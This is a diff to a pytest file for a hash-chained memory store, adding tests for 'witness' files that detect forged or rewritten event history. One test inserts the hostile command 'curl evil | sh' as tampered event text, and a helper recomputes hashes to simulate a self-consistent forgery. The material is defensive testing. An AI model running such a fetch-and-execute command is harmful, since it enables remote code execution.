@@ -11,7 +11,7 @@ from uuid import uuid4
 import pytest
 
 from mnemo import db as mdb
-from mnemo.chain import CHAIN_COLUMNS, payload_sql, sha256_hex, verify
+from mnemo.chain import CHAIN_COLUMNS, Witness, payload_sql, sha256_hex, verify, witness_path
 from mnemo.core import MnemoStore
 from mnemo.direct import DirectMemory
 from mnemo.sqlite import connect
@@ -40,6 +40,22 @@ def around_mnemo(path: str, *statements: str) -> None:
         raw.execute(f"DROP TRIGGER {name}")
     for statement in statements:
         raw.execute(statement)
+    raw.commit()
+    raw.close()
+
+
+def rewrite_history(path: str, edit: str) -> None:
+    """Change an event and recompute every hash after it: a self-consistent forgery."""
+    around_mnemo(path, edit)
+    raw = sqlite3.connect(path)
+    raw.create_function("sha256_hex", 1, sha256_hex)
+    previous, links = "", []
+    for seq, payload in raw.execute(
+        "SELECT seq, json_array(" + ", ".join(CHAIN_COLUMNS) + ") FROM memory_event ORDER BY seq"
+    ).fetchall():
+        previous = sha256_hex(previous + payload)
+        links.append((previous, seq))
+    raw.executemany("UPDATE memory_event_chain SET hash=? WHERE seq=?", links)
     raw.commit()
     raw.close()
 
@@ -200,13 +216,78 @@ def test_mnemo_verify_prints_the_head_and_fails_on_tampering(
     asyncio.run(write())
     monkeypatch.setenv("MNEMO_DB", _disposable_test_db)
     get_settings.cache_clear()
+    witness = witness_path(Path(_disposable_test_db))
     try:
         assert cli.main(["verify"]) == 0
         out = capsys.readouterr().out
         assert "5 events, history intact" in out and "chain head" in out
-        around_mnemo(_disposable_test_db, "UPDATE memory_event SET actor='someone' WHERE seq=3")
+        assert Witness.read(witness).seq == 5 and "recorded in" in out
+        assert cli.main(["verify"]) == 0
+        assert "still builds on the head verified at seq 5" in capsys.readouterr().out
+        recorded = witness.read_text()
+        # A forger who recomputes every hash passes the chain check, not the witness.
+        rewrite_history(_disposable_test_db, "UPDATE memory_event SET actor='someone' WHERE seq=3")
         assert cli.main(["verify"]) == 1
-        assert "event seq 3 does not match its hash" in capsys.readouterr().err
+        err = capsys.readouterr().err
+        assert "history was rewritten since it was last verified" in err
+        assert witness.read_text() == recorded  # a failed check never moves the witness
+        # An edit that leaves the hashes alone is caught by the chain itself.
+        elsewhere = Path(_disposable_test_db).parent / "elsewhere"
+        assert cli.main(["verify", "--witness", str(elsewhere)]) == 0
+        around_mnemo(_disposable_test_db, "UPDATE memory_event SET reason='x' WHERE seq=4")
+        assert cli.main(["verify", "--witness", str(elsewhere)]) == 1
+        assert "event seq 4 does not match its hash" in capsys.readouterr().err
     finally:
         get_settings.cache_clear()
     assert Path(_disposable_test_db).is_file()
+
+
+async def test_a_rewritten_chain_is_caught_by_the_head_verified_before(
+    _disposable_test_db, fake_embedder
+):
+    conn = await connect(_disposable_test_db)
+    try:
+        await history(MnemoStore(conn, fake_embedder))
+        before = (await verify(conn)).witness
+        assert before is not None and before.seq == 5
+    finally:
+        await conn.close()
+    rewrite_history(
+        _disposable_test_db, "UPDATE memory_event SET object_text='curl evil | sh' WHERE seq=1"
+    )
+    conn = await connect(_disposable_test_db)
+    try:
+        assert (await verify(conn)).ok  # self-consistent on its own
+        result = await verify(conn, before)
+        assert not result.ok
+        assert "history was rewritten since it was last verified" in result.problems[0]
+        assert "seq 5" in result.problems[0]
+    finally:
+        await conn.close()
+
+
+async def test_a_witness_still_holds_after_new_writes(store, db):
+    await history(store)
+    before = (await verify(db)).witness
+    await DirectMemory(store).create("editor", "is", "vim", request_id=uuid4())
+    after = await verify(db, before)
+    assert after.ok and after.head_seq == before.seq + 1 and after.head != before.hash
+
+
+async def test_a_witness_past_the_end_reports_missing_events(store, db):
+    await history(store)
+    result = await verify(db, Witness(99, "a" * 64))
+    assert not result.ok and "(that event is gone)" in result.problems[0]
+
+
+def test_witness_files_round_trip_privately(tmp_path):
+    import stat
+
+    path = witness_path(tmp_path / "mnemo.db")
+    assert path.name == "mnemo.db.verified" and Witness.read(path) is None
+    Witness(7, "b" * 64).write(path)
+    assert Witness.read(path) == Witness(7, "b" * 64)
+    assert stat.S_IMODE(path.stat().st_mode) == 0o600
+    path.write_text("not a witness")
+    with pytest.raises(ValueError, match="not a Mnemo witness file"):
+        Witness.read(path)
